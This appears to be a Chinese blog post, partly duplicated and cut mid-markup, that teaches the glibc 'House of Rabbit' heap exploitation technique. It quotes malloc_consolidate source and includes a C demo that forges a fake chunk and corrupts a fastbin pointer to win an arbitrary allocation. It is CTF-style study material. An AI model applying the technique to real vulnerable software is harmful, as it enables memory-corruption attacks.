class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n<ol>\n<li>这是因为后续free(b) ，触发malloc_consolidate,时会检测nextinuse。如果是0就会触发unlink，而我们的利用是不能走这条路的，所以为了绕过，就需要把nextinuse置1.</li>\n<li>同时因为这个绕过在前，所以我们先将fakechunk 的size设置为很小的0x20，这样置1的位置也很近，更方便。</li>\n<li>在检测中是nextinuse，因为我们的size为0。通过buf[6]+0，得到的还是buf[6]自己,所以只需要在这里置1就ok了.</li>\n</ol>\n<h2 id=\"为什么fakechunk前要置0xfffffffffffffff0？\"><a href=\"#为什么fakechunk前要置0xfffffffffffffff0？\" class=\"headerlink\" title=\"为什么fakechunk前要置0xfffffffffffffff0？\"></a>为什么fakechunk前要置0xfffffffffffffff0？</h2><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/d7c462933cf8847287b123a9d1dc54f5.png\" alt=\"_int_malloc中的检测\"></p>\n<ol>\n<li>在后续malloc(c)是，也就将largebin 迁移到target的调用中，有检测。就是[buf+size] -size，当这个结果为0 时，才能正常进行。</li>\n<li>因为我们将size设置为了0xfffffffffffffff0，所以[buf+size]要等于0xfffffffffffffff0。那么[buf+size]又是何处呢？</li>\n<li>其实就是buf-0x10。图中的r15，就是我们之前链入fastbins 的地址。</li>\n</ol>\n<h2 id=\"关键部分演示\"><a href=\"#关键部分演示\" class=\"headerlink\" title=\"关键部分演示\"></a>关键部分演示</h2><h3 id=\"把buf链入fastbins\"><a href=\"#把buf链入fastbins\" class=\"headerlink\" title=\"把buf链入fastbins\"></a>把buf链入fastbins</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630032850548.png\" alt=\"buf入fastbins\"></p>\n<h3 id=\"free-b触发malloc-consolidate\"><a href=\"#free-b触发malloc-consolidate\" class=\"headerlink\" title=\"free b触发malloc_consolidate\"></a>free b触发malloc_consolidate</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033107787.png\" alt=\"触发malloc_consolidate\"></p>\n<h3 id=\"把buf放入largebin\"><a href=\"#把buf放入largebin\" class=\"headerlink\" title=\"把buf放入largebin\"></a>把buf放入largebin</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033400440.png\" alt=\"image-20250630033400440\"><br>因为大小不够，所以会被放入large bin</p>\n<h3 id=\"malloc，迁移largebins\"><a href=\"#malloc，迁移largebins\" class=\"headerlink\" title=\"malloc，迁移largebins\"></a>malloc，迁移largebins</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033528949.png\" alt=\"image-20250630033528949\"></p>\n<ol>\n<li>这次大小足够了可以分配</li>\n<li>这个偏移计算是$[（target-0x10）-buf]-0x10$</li>\n</ol>\n<h3 id=\"分配target\"><a href=\"#分配target\" class=\"headerlink\" title=\"分配target\"></a>分配target</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630034203589.png\" alt=\"image-20250630034203589\"><br>下一步就可以分配到target了</p>\n","excerpt":"","more":"<h1 id=\"House-of-Rabbit\"><a href=\"#House-of-Rabbit\" class=\"headerlink\" title=\"House of Rabbit\"></a>House of Rabbit</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​哎呀，也不知道怎么说，看CTFshow上的poc总有一种无力感，啥玩意也没有。那个注释吧，也就是把how2heap的注释翻译了一下吧。真感觉他自己过个几年回来看自己的poc，估计也不知道是怎么利用吧。反正感觉写得莫名其妙，描述的语言逻辑不清楚。好在看雪上有一篇精华帖，写得很好，讲到了关键点。<br>​现在就是自己重新分析，改一下他的poc吧。</p>\n<h2 id=\"相关源码\"><a href=\"#相关源码\" class=\"headerlink\" title=\"相关源码\"></a>相关源码</h2><p><strong>文件路径(malloc&#x2F;malloc.c)</strong></p>\n<h3 id=\"malloc-consolidate\"><a href=\"#malloc-consolidate\" class=\"headerlink\" title=\"malloc_consolidate\"></a>malloc_consolidate</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">malloc_consolidate</span><span class=\"params\">(mstate av)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mfastbinptr*    fb;                 <span class=\"comment\">/* current fastbin being consolidated */</span></span><br><span class=\"line\">  mfastbinptr*    maxfb;              <span class=\"comment\">/* last fastbin (for loop control) */</span></span><br><span class=\"line\">  mchunkptr       p;                  <span class=\"comment\">/* current chunk being consolidated */</span></span><br><span class=\"line\">  mchunkptr       nextp;              <span class=\"comment\">/* next chunk to consolidate */</span></span><br><span class=\"line\">  mchunkptr       unsorted_bin;       <span class=\"comment\">/* bin header */</span></span><br><span class=\"line\">  mchunkptr       first_unsorted;     <span class=\"comment\">/* chunk to link to */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* These have same use as in free() */</span></span><br><span class=\"line\">  mchunkptr       nextchunk;</span><br><span class=\"line\">  INTERNAL_SIZE_T size;</span><br><span class=\"line\">  INTERNAL_SIZE_T nextsize;</span><br><span class=\"line\">  INTERNAL_SIZE_T prevsize;</span><br><span class=\"line\">  <span class=\"type\">int</span>             nextinuse;</span><br><span class=\"line\">  mchunkptr       bck;</span><br><span class=\"line\">  mchunkptr       fwd;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class=\"line\"><span class=\"comment\">    yet been initialized, in which case do so below</span></span><br><span class=\"line\"><span class=\"comment\">  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (get_max_fast () != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    clear_fastchunks(av);</span><br><span class=\"line\"></span><br><span class=\"line\">    unsorted_bin = unsorted_chunks(av);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class=\"line\"><span class=\"comment\">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class=\"line\"><span class=\"comment\">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class=\"line\"><span class=\"comment\">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class=\"line\"><span class=\"comment\">      reused anyway.</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    maxfb = &amp;fastbin (av, NFASTBINS - <span class=\"number\">1</span>);</span><br><span class=\"line\">    fb = &amp;fastbin (av, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">      p = atomic_exchange_acq (fb, <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (p != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">\t  check_inuse_chunk(av, p);</span><br><span class=\"line\">\t  nextp = p-&gt;fd;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"comment\">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class=\"line\">\t  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class=\"line\">\t  nextchunk = chunk_at_offset(p, size);</span><br><span class=\"line\">\t  nextsize = chunksize(nextchunk);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">\t    prevsize = p-&gt;prev_size;</span><br><span class=\"line\">\t    size += prevsize;</span><br><span class=\"line\">\t    p = chunk_at_offset(p, -((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">\t    unlink(av, p, bck, fwd);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class=\"line\">\t    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (!nextinuse) &#123;</span><br><span class=\"line\">\t      size += nextsize;</span><br><span class=\"line\">\t      unlink(av, nextchunk, bck, fwd);</span><br><span class=\"line\">\t    &#125; <span class=\"keyword\">else</span></span><br><span class=\"line\">\t      clear_inuse_bit_at_offset(nextchunk, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class=\"line\">\t    unsorted_bin-&gt;fd = p;</span><br><span class=\"line\">\t    first_unsorted-&gt;bk = p;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class=\"line\">\t      p-&gt;fd_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t      p-&gt;bk_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    set_head(p, size | PREV_INUSE);</span><br><span class=\"line\">\t    p-&gt;bk = unsorted_bin;</span><br><span class=\"line\">\t    p-&gt;fd = first_unsorted;</span><br><span class=\"line\">\t    set_foot(p, size);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t    size += nextsize;</span><br><span class=\"line\">\t    set_head(p, size | PREV_INUSE);</span><br><span class=\"line\">\t    av-&gt;top = p;</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">while</span> ( (p = nextp) != <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span> (fb++ != maxfb);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    malloc_init_state(av);</span><br><span class=\"line\">    check_malloc_state(av);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>判断是否初始化.若未初始化，则初始化.</li>\n<li>将fastbins清空。遍历fastbins.<ul>\n<li>向后合并(低地址),能合就合</li>\n<li>向前合并(高地址),能合就合</li>\n</ul>\n</li>\n<li>如果合并后与topchunk相邻则合并入topchunk.</li>\n<li>否则插入到unsortedbin 前面.</li>\n</ol>\n<h2 id=\"相关调用\"><a href=\"#相关调用\" class=\"headerlink\" title=\"相关调用\"></a>相关调用</h2><ol>\n<li><code>_int_malloc()</code>中调用<ul>\n<li>申请large chunk 时，且arena 存在fastbins chunk 触发</li>\n<li>申请small chunk时，victim&#x3D;&#x3D;0时触发(错误处理)</li>\n</ul>\n</li>\n<li><code>mtrim()</code>中调用</li>\n<li><code>__libc_mallopt()</code>中调用</li>\n<li><code>_int_free</code>中调用<ul>\n<li>释放到unsortedbin进行consolidation的过程中，在向前向后合并完成了以后，如果合并后大小大于0xffff，就检测fastbin chunk并进行合并</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"利用思路和条件\"><a href=\"#利用思路和条件\" class=\"headerlink\" title=\"利用思路和条件\"></a>利用思路和条件</h2><h3 id=\"思路-感觉更像流程\"><a href=\"#思路-感觉更像流程\" class=\"headerlink\" title=\"思路(感觉更像流程)\"></a>思路(感觉更像流程)</h3><ol>\n<li>申请大堆块，增加av-&gt;system_mem和触发grow_heap . 使heap空间初始化与.bss等段空间相邻 .</li>\n<li>在想要分配的地址(设为target)附近伪造fake chunk(设为buf)，然后申请一个fastbins(设为a)大小的  ，一个smallbin(设为b)大小的chunk。</li>\n<li>先将a 放入fastbins 中，通过溢出或者uaf 漏洞，将buf链入fastbins 中。通过free掉b，触发malloc_consodilate,把 fastbins清空且插入unsorted bin。<strong>因为a和b相邻所以都被合并到topchunk，而buf不相邻，所以会无法合并，而被插入到unsortedbin 中。</strong></li>\n<li>再次通过申请大堆块，把unosorted bin 放入large bin 中。当然，为了能成功的进入large bin，我们需要先修改buf的size在合理的范围。</li>\n<li>最后继续修改buf的size为0xfffffffffffffff1，再计算与target的偏移，申请偏移大小的堆块后，即可分配到target。</li>\n</ol>\n<h3 id=\"个人理解\"><a href=\"#个人理解\" class=\"headerlink\" title=\"个人理解\"></a>个人理解</h3><ol>\n<li>感觉关键在于第三步触发malloc_consodilate时，可以有一个把任意地址链入unsorted bin的机会。利用这个可以后续完成任意地址的分配。</li>\n<li>但是感觉前面的准备工作很多，第三步之后的部分和house of force 后续的手法差不多。一个是通过topchunk 与 target 的偏移；一个是利用large chunk 与 target 的偏移。</li>\n<li>如果按照上述流程的话，一开始就要申请两次大堆块。感觉有点明显（出题的话）。</li>\n<li>后续对fastbins chunk 合并时增加了检查，使得利用更加得困难。</li>\n</ol>\n<h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h3><ol>\n<li>首先就是对堆块的申请大小没有限制。在这个过程中，我们申请了极大的堆块，同时也有最小的堆块，如果堆块的大小被限制的话就很难搞。</li>\n<li>存在溢出漏洞，或者uaf。允许我们可以修改处于空闲状态的堆块的fd指针和size。</li>\n<li>中间不能有不能free的堆块。如果有自动申请的堆块，而且还不会被free，可能会卡我们位置。导致第三步的时候出现问题。（但感觉，有1,2 两点的话，应该也可以绕过。感觉加上这个应该会很好玩）。</li>\n</ol>\n<h2 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> target[<span class=\"number\">20</span>]=<span class=\"string\">&quot;hello world&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span>  buf[<span class=\"number\">20</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdin</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">size_t</span>* a;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>* b;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>* c;</span><br><span class=\"line\">    <span class=\"type\">char</span>* d;</span><br><span class=\"line\">    <span class=\"comment\">/*申请两次大堆块，并free*/</span></span><br><span class=\"line\">    a=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xa00000</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m第一步申请一个大堆块然后free，使system-&gt;mem提升:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;第一次申请a，a的地址：%p\\n&quot;</span>,a<span class=\"number\">-2</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">    </span><br><span class=\"line\">    a=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xa00000</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m第二次继续申请一个大堆块，然后free，触发heap_grow:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;第二次申请a，a的地址：%p\\n\\n&quot;</span>,a<span class=\"number\">-2</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*申请两个堆块，一个fastbins大小 ，一个smallbin大小*/</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m此时申请一个fast chunk，一个small chunk为后续利用作铺垫:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    a=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);</span><br><span class=\"line\">    b=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fast chunk a: %p\\n&quot;</span>,a<span class=\"number\">-2</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;small chunk b: %p\\n\\n&quot;</span>,b<span class=\"number\">-0x10</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    用来链入large bin的fake chunk,注意从buf[1]~buf[5]是我们的fake chunk</span></span><br><span class=\"line\"><span class=\"comment\">    buf[0]是为了绕过_int_malloc中的检测，</span></span><br><span class=\"line\"><span class=\"comment\">    buf[7]是为了绕过_int_free时调用的consolidate的检测。</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    buf[<span class=\"number\">0</span>]=<span class=\"number\">0xfffffffffffffff0</span>;<span class=\"comment\">/*在检测中会用size+buf[2] 与size 比较，结果为0才能正确绕过*/</span></span><br><span class=\"line\">    buf[<span class=\"number\">1</span>]=<span class=\"number\">0x0</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">2</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">3</span>]=<span class=\"number\">0x21</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">4</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">5</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">6</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">7</span>]=<span class=\"number\">1</span>;  <span class=\"comment\">/*绕过malloc_consolidate 中的unlink操作*/</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m伪造一个fake chunk，并为绕过一些检测，在某些地方埋伏笔\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;这是fake chunk--buf[2]的地址: %p\\n&quot;</span>,buf+<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;这是目标target的地址: %p\\n&quot;</span>,target);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m为了绕过检测而提前作的准备:\\033[0m;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;buf[2]-0x10: %#lx\\n&quot;</span>,buf[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;buf[2]+0x28: %#lx\\n&quot;</span>,buf[<span class=\"number\">7</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;buf[2]的size: %#lx\\n\\n&quot;</span>,buf[<span class=\"number\">3</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*把a 放入fastbins ,把buf链入fastbin*/</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m先free a,在通过修改a的fd，把buf[2]链入，随后free b触发:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">    *a=(<span class=\"type\">size_t</span>)(&amp;buf[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"comment\">/*触发malloc_consolidate*/</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(b);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*申请大堆块把buf放进largebin，修改buf size*/</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m先修改buf 的size，使其可以被放入large bin中:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    buf[<span class=\"number\">3</span>]=<span class=\"number\">0xa00001</span>;</span><br><span class=\"line\">    b=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xa00000</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;buf[2]的size: %#lx\\n\\n&quot;</span>,buf[<span class=\"number\">3</span>]);</span><br><span class=\"line\">    <span class=\"comment\">/*再次修改size*/</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m把buf 的size 修改为很大，使得可以分配到我们的target：\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    buf[<span class=\"number\">3</span>]=<span class=\"number\">0xfffffffffffffff1</span>;</span><br><span class=\"line\">    <span class=\"comment\">/**/</span></span><br><span class=\"line\">    c=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xffffffffffffff80</span>);</span><br><span class=\"line\">    d=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;分配到的d:%p\\n&quot;</span>,d);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;target: %p\\n&quot;</span>,target);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"为什么fakechunk-后要设置1？\"><a href=\"#为什么fakechunk-后要设置1？\" class=\"headerlink\" title=\"为什么fakechunk 后要设置1？\"></a>为什么fakechunk 后要设置1？</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!nextinuse) &#123;</span><br><span class=\"line\">\t      size += nextsize;</span><br><span class=\"line\">\t      unlink(av, nextchunk, bck, fwd);</span><br><span class=\"line\">\t    &#125; <span class=\"keyword\">else</span></span><br><span class=\"line\">\t      clear_inuse_bit_at_offset(nextchunk, <span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n<ol>\n<li>这是因为后续free(b) ，触发malloc_consolidate,时会检测nextinuse。如果是0就会触发unlink，而我们的利用是不能走这条路的，所以为了绕过，就需要把nextinuse置1.</li>\n<li>同时因为这个绕过在前，所以我们先将fakechunk 的size设置为很小的0x20，这样置1的位置也很近，更方便。</li>\n<li>在检测中是nextinuse，因为我们的size为0。通过buf[6]+0，得到的还是buf[6]自己,所以只需要在这里置1就ok了.</li>\n</ol>\n<h2 id=\"为什么fakechunk前要置0xfffffffffffffff0？\"><a href=\"#为什么fakechunk前要置0xfffffffffffffff0？\" class=\"headerlink\" title=\"为什么fakechunk前要置0xfffffffffffffff0？\"></a>为什么fakechunk前要置0xfffffffffffffff0？</h2><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/d7c462933cf8847287b123a9d1dc54f5.png\" alt=\"_int_malloc中的检测\"></p>\n<ol>\n<li>在后续malloc(c)是，也就将largebin 迁移到target的调用中，有检测。就是[buf+size] -size，当这个结果为0 时，才能正常进行。</li>\n<li>因为我们将size设置为了0xfffffffffffffff0，所以[buf+size]要等于0xfffffffffffffff0。那么[buf+size]又是何处呢？</li>\n<li>其实就是buf-0x10。图中的r15，就是我们之前链入fastbins 的地址。</li>\n</ol>\n<h2 id=\"关键部分演示\"><a href=\"#关键部分演示\" class=\"headerlink\" title=\"关键部分演示\"></a>关键部分演示</h2><h3 id=\"把buf链入fastbins\"><a href=\"#把buf链入fastbins\" class=\"headerlink\" title=\"把buf链入fastbins\"></a>把buf链入fastbins</h3><p><img 